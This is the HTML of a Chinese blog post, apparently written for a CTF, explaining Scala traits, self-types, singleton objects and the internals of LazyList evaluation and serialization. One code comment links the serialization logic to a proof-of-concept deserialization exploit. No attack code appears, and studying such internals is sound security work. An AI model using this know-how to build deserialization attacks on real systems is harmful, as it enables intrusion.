class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">trait</span> PersonBody <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">val</span> height<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>它不能被实例化，像java中的接口</li>\n</ul>\n<h4 id=\"扩展单个特质\"><a href=\"#扩展单个特质\" class=\"headerlink\" title=\"扩展单个特质\"></a>扩展单个特质</h4><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">trait</span> PersonBody <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> height<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">class</span> Person<span class=\"token punctuation\">(</span>name <span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">extends</span> PersonBody<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">var</span> height<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span> <span class=\"token operator\">=</span> <span class=\"token number\">170</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">def</span> main<span class=\"token punctuation\">(</span>args<span class=\"token operator\">:</span> Array<span class=\"token punctuation\">[</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"Cloud\"</span><span class=\"token punctuation\">)</span>\n    println<span class=\"token punctuation\">(</span>person<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">//170</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>重写(实现)属性或方法时，需要使用override关键字来修饰</strong></p>\n<p><strong>trait的方法声明必须被实现</strong></p>\n<h4 id=\"扩展多个特质\"><a href=\"#扩展多个特质\" class=\"headerlink\" title=\"扩展多个特质\"></a>扩展多个特质</h4><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">trait</span> PersonBody <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> height<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">trait</span> PersonHobby<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> hobbyGame<span class=\"token operator\">=</span><span class=\"token string\">\"Honor of King : World\"</span>\n    <span class=\"token keyword\">def</span> showHobby<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token builtin\">Unit</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">trait</span> PersonScore<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> math<span class=\"token operator\">=</span><span class=\"token string\">\"150\"</span>\n    <span class=\"token keyword\">def</span> showScore<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token builtin\">Unit</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">class</span> Person<span class=\"token punctuation\">(</span>name <span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">extends</span> PersonBody <span class=\"token keyword\">with</span> PersonHobby <span class=\"token keyword\">with</span> PersonScore <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">var</span> height<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span> <span class=\"token operator\">=</span> <span class=\"token number\">170</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">def</span> showHobby<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      println<span class=\"token punctuation\">(</span>hobbyGame<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">def</span> showScore<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      println<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">def</span> main<span class=\"token punctuation\">(</span>args<span class=\"token operator\">:</span> Array<span class=\"token punctuation\">[</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"Cloud\"</span><span class=\"token punctuation\">)</span>\n    person<span class=\"token punctuation\">.</span>showHobby<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    person<span class=\"token punctuation\">.</span>showScore<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/*\n输出\nHonor of King : World\n150\n*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>跟着多个with，扩展多个特质</li>\n</ul>\n<h3 id=\"自身类型self-type\"><a href=\"#自身类型self-type\" class=\"headerlink\" title=\"自身类型self-type\"></a>自身类型self-type</h3><p>self-type表示一个类或特质依赖于另一个类型，即它必须和另一个类型混入（mixin）才能被实例化。</p>\n<ul>\n<li>假设有一个类Cat</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">class</span> Cat <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Tom\"</span>\n  <span class=\"token keyword\">val</span> color<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Gray\"</span>\n  <span class=\"token keyword\">def</span> meow<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> println<span class=\"token punctuation\">(</span><span class=\"token string\">\"Meow!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>现在想给猫添加一些新的功能，比如说话、唱歌、跳舞</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">trait</span> Talkative <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> talk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">trait</span> Singer <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> sing<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">trait</span> Dancer <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> dance<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>但是并不是所有的猫都有，假设只有会说话的猫才能唱歌，也就是唱歌依赖于说话</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">trait</span> Talkative <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> talk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">trait</span> Singer <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">self</span><span class=\"token operator\">:</span> Talkative <span class=\"token keyword\">=></span> <span class=\"token comment\">// 声明自身类型，表示Singer依赖于Talkative</span>\n  <span class=\"token keyword\">def</span> sing<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    talk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 可以直接使用Talkative的成员</span>\n    println<span class=\"token punctuation\">(</span><span class=\"token string\">\"La la la...\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">trait</span> Dancer <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">self</span><span class=\"token operator\">:</span> Singer <span class=\"token keyword\">=></span> <span class=\"token comment\">// 声明自身类型，表示Dancer依赖于Singer</span>\n  <span class=\"token keyword\">def</span> dance<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    sing<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 可以直接使用Singer的成员</span>\n    println<span class=\"token punctuation\">(</span><span class=\"token string\">\"Shake shake shake...\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时我再新建对象，也就是给猫混入了这些 特质</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">val</span> tom <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Cat <span class=\"token keyword\">with</span> Talkative <span class=\"token keyword\">with</span> Singer <span class=\"token keyword\">with</span> Dancer <span class=\"token comment\">// 创建一个会说话、唱歌、跳舞的猫</span>\ntom<span class=\"token punctuation\">.</span>talk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出：Meow!</span>\ntom<span class=\"token punctuation\">.</span>sing<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出：Meow! La la la...</span>\ntom<span class=\"token punctuation\">.</span>dance<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出：Meow! La la la... Shake shake shake...</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是如果给猫没有talkative，而是直接Singer，就会报错</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">val</span> jerry <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Cat <span class=\"token keyword\">with</span> Singer <span class=\"token comment\">// 报错：illegal inheritance; self-type Cat with Singer does not conform to Singer's selftype Singer with Talkative</span>\n<span class=\"token keyword\">val</span> lily <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Cat <span class=\"token keyword\">with</span> Dancer <span class=\"token comment\">// 报错：illegal inheritance; self-type Cat with Dancer does not conform to Dancer's selftype Dancer with Singer</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"单例对象\"><a href=\"#单例对象\" class=\"headerlink\" title=\"单例对象\"></a>单例对象</h3><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> TestScalaObject <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">val</span> TEST_SYMBOL <span class=\"token operator\">=</span> <span class=\"token string\">\"*\"</span>\n <span class=\"token keyword\">def</span> testMethod<span class=\"token punctuation\">(</span>x <span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token builtin\">String</span> <span class=\"token operator\">=</span> x\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用关键字object直接定义的，这种就是单例对象，如果我对他编译，就会产生下面的结果</p>\n<p><img src=\"/../SCTF/image-20230904112938880.png\" alt=\"image-20230904112938880\"></p>\n<p><strong>问题：那这个如果反编译之后呢？</strong></p>\n<p><em>TestScalaObject.class</em>:</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\">public <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> TestScalaObject <span class=\"token keyword\">extends</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>Object<span class=\"token punctuation\">&#123;</span>\n    public static <span class=\"token keyword\">final</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span> testMethod<span class=\"token punctuation\">(</span>java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    public static <span class=\"token keyword\">final</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span> TEST_SYMBOL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><em>TestScalaObject$.class</em>:</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\">public <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> TestScalaObject$ <span class=\"token keyword\">extends</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>Object implements scala<span class=\"token punctuation\">.</span>ScalaObject<span class=\"token punctuation\">&#123;</span>\n    public static <span class=\"token keyword\">final</span> TestScalaObject$ MODULE$<span class=\"token punctuation\">;</span>\n    public static <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    public java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span> TEST_SYMBOL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    public java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span> testMethod<span class=\"token punctuation\">(</span>java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>MODULE$</code> 的存在是为了保持对象的单例性。由于 Scala 对象是单例的，编译器会在伴生类中创建一个静态的、命名为 <code>MODULE$</code> 的实例，以确保对象始终是单例的。</p>\n<p>这样，你可以通过 <code>TestScalaObject$.MODULE$</code> 来访问 <code>TestScalaObject</code> 对象的方法和属性。</p>\n<p>在你的例子中，<code>TestScalaObject$.MODULE$</code> 实际上是 <code>TestScalaObject</code> 对象的实例。通过它，你可以访问 <code>TestScalaObject</code> 中定义的成员，如 <code>TEST_SYMBOL</code> 和 <code>testMethod</code>。</p>\n<p>总结一下，<code>public static final TestScalaObject$ MODULE$;</code> 是一个静态的、命名为 <code>MODULE$</code> 的对象，它代表了 <code>TestScalaObject</code> 对象的单例实例。它的存在确保了对象的单例性，并允许你通过它访问对象中定义的成员。</p>\n<h3 id=\"Lazylist\"><a href=\"#Lazylist\" class=\"headerlink\" title=\"Lazylist\"></a>Lazylist</h3><p>lazylist是一种惰性求值的列表，列表中的元素只有在需要的时候才会被计算，而不是一开始就全部计算好。这样可以节省内存和时间，也可以表示无限的序列。</p>\n<h4 id=\"State-head及tail\"><a href=\"#State-head及tail\" class=\"headerlink\" title=\"State,head及tail\"></a>State,head及tail</h4><p><img src=\"/../SCTF/image-20230831095859251.png\" alt=\"image-20230831095859251\"></p>\n<p>State：</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">sealed</span> <span class=\"token keyword\">trait</span> State<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span>A<span class=\"token punctuation\">]</span> <span class=\"token keyword\">extends</span> Serializable <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> head<span class=\"token operator\">:</span> A\n  <span class=\"token keyword\">def</span> tail<span class=\"token operator\">:</span> LazyList<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>state:</p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">lazy</span> <span class=\"token keyword\">val</span> state<span class=\"token operator\">:</span> State<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// if it's already mid-evaluation, we're stuck in an infinite</span>\n  <span class=\"token comment\">// self-referential loop (also it's empty)</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>midEvaluation<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> RuntimeException<span class=\"token punctuation\">(</span><span class=\"token string\">\"self-referential LazyList or a derivation thereof has no more elements\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n  midEvaluation <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n  <span class=\"token keyword\">val</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">try</span> lazyState<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">finally</span> midEvaluation <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span>\n  <span class=\"token comment\">// if we set it to `true` before evaluating, we may infinite loop</span>\n  <span class=\"token comment\">// if something expects `state` to already be evaluated</span>\n  stateEvaluated <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n  lazyState <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span> <span class=\"token comment\">// allow GC</span>\n  res\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>这里的state是一个field，也就可以理解成一个私有变量，它接受的返回值是State，所以要想调用head，是state.head</li>\n</ul>\n<p><strong>bitmap$0</strong></p>\n<p>来自StackOverflow</p>\n<p>That’s where the initialization states for <code>lazy val</code>s are stored. When you access a <code>lazy val</code> (or a nested <code>object</code>, which is equivalent), the compiler uses the bitmap field to determine whether it’s already been evaluated.</p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><ul>\n<li>首先创建一个具有无限个数字1的Lazylist</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">val</span> ones <span class=\"token operator\">=</span> LazyList<span class=\"token punctuation\">.</span>continually<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>下面这个表示丢弃前0个元素，使用head方法获取剩余list的第一个元素</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\">println<span class=\"token punctuation\">(</span>ones<span class=\"token punctuation\">.</span>drop<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//1</span>\nprintln<span class=\"token punctuation\">(</span>ones<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//LazyList(1, &lt;not computed>)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>问题1：这里为什么会输出not computed？</strong></p>\n<ul>\n<li>创建lazylist时，lazylist会接受一个参数lazyState，它会返回一个State对象</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">sealed</span> <span class=\"token keyword\">trait</span> State<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span>A<span class=\"token punctuation\">]</span> <span class=\"token keyword\">extends</span> Serializable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">def</span> head<span class=\"token operator\">:</span> A\n    <span class=\"token keyword\">def</span> tail<span class=\"token operator\">:</span> LazyList<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>此时head和tail的方法还没有被实现，所以就显示not computed</li>\n</ul>\n<p><strong>问题2：接下来的调用流程是啥</strong></p>\n<ul>\n<li>接着由于我们的代码中用了head，就会用到state，此时开始调用</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">lazy</span> <span class=\"token keyword\">val</span> state<span class=\"token operator\">:</span> State<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>从上面的源码中可以看到，会调用lazyState方法，这个lazyState就是LazyList的构造器接受的那个匿名函数。</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">val</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">try</span> lazyState<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">finally</span> midEvaluation <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>这个State的head方法返回数字1，而tail方法返回一个新的存着无限个1的LazyList，最后返回的是State[A]</li>\n</ul>\n<p><strong>通过上面的流程可以看出lazylist的本质是不停的用方法取值，而不是一开始所有的1存在内存中</strong></p>\n<h4 id=\"Lazylist的序列化和反序列化\"><a href=\"#Lazylist的序列化和反序列化\" class=\"headerlink\" title=\"Lazylist的序列化和反序列化\"></a>Lazylist的序列化和反序列化</h4><p><strong>序列化</strong></p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">def</span> writeObject<span class=\"token punctuation\">(</span>out<span class=\"token operator\">:</span> ObjectOutputStream<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      out<span class=\"token punctuation\">.</span>defaultWriteObject<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">var</span> these <span class=\"token operator\">=</span> coll\n      <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>these<span class=\"token punctuation\">.</span>knownNonEmpty<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        out<span class=\"token punctuation\">.</span>writeObject<span class=\"token punctuation\">(</span>these<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">)</span><span class=\"token comment\">//这里决定了POC里的createLazyList中，为什么需要设置一个空的state</span>\n        these <span class=\"token operator\">=</span> these<span class=\"token punctuation\">.</span>tail\n      <span class=\"token punctuation\">&#125;</span>\n      out<span class=\"token punctuation\">.</span>writeObject<span class=\"token punctuation\">(</span>SerializeEnd<span class=\"token punctuation\">)</span>\n      out<span class=\"token punctuation\">.</span>writeObject<span class=\"token punctuation\">(</span>these<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>首先调用默认的wirteObject方法，标准的序列化</li>\n<li>然后判断已经计算过的元素，将么个元素序列化</li>\n<li>遇到没计算过的元素，跳出循环</li>\n<li>序列化一个SerializeEnd，表示计算过的元素序列化完了</li>\n<li>将tail，也就是未计算的元素序列化</li>\n</ul>\n<p><strong>反序列化</strong></p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">private</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">def</span> readObject<span class=\"token punctuation\">(</span>in<span class=\"token operator\">:</span> ObjectInputStream<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      in<span class=\"token punctuation\">.</span>defaultReadObject<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">val</span> init <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> ArrayBuffer<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span>\n      <span class=\"token keyword\">var</span> initRead <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span>\n      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>initRead<span class=\"token punctuation\">)</span> in<span class=\"token punctuation\">.</span>readObject <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">case</span> SerializeEnd <span class=\"token keyword\">=></span> initRead <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n        <span class=\"token keyword\">case</span> a <span class=\"token keyword\">=></span> init <span class=\"token operator\">+=</span> a<span class=\"token punctuation\">.</span>asInstanceOf<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">val</span> tail <span class=\"token operator\">=</span> in<span class=\"token punctuation\">.</span>readObject<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asInstanceOf<span class=\"token punctuation\">[</span>LazyList<span class=\"token punctuation\">[</span>A<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n      coll <span class=\"token operator\">=</span> init <span class=\"token operator\">++</span><span class=\"token operator\">:</span> tail\n    <span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" 